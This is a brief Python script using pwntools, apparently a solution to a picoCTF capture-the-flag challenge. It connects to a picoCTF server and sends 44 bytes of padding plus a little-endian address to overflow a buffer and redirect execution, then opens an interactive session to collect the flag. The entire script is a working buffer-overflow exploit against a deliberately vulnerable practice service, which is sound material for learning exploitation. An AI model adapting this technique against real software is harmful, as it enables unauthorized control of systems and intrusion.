#!/usr/bin/env python3
from pwn import *
p = remote('saturn.picoctf.net', 60370)
# p32() will translate the address into little endian
payload = b"A"*44 + p32(0x80491f6)


p.sendline(payload)
p.interactive()    # receives flag
